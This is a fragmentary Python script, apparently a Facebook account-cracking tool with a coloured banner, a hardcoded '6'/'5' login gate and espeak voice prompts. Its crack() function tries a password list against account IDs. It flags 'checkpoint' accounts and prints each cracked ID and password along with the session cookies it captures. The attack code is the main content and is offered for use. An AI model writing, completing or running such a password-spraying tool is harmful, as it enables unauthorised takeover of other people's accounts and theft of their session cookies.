...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m JOINT MY FACEBOOK ID")
time.sleep(2)
...
while attemps < 12345677901:
    os.system('espeak -a 400 " Username 6"')
    username = input(' \033[0;92mEnter Username: ')
    os.system('espeak -a 400 " Password 5"')
    password = input(' \033[0;93mEnter Password: ')

    if username == '6' and password == '5': 
        print(' \033[0;92mYou Have Successfully Logged in.')
        os.system('espeak -a 1000 " Successfully Logged in"')
        break
    else:
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Ayesha.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;36m║version      : 001                 ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;39m║══════════════════════════════════║║                      ║
...
os.system('espeak -a 300 " Welcome,   to,  nayem,    Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Ayesha•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Ayesha-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Ayesha-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ayesha,  Ok,  id"')
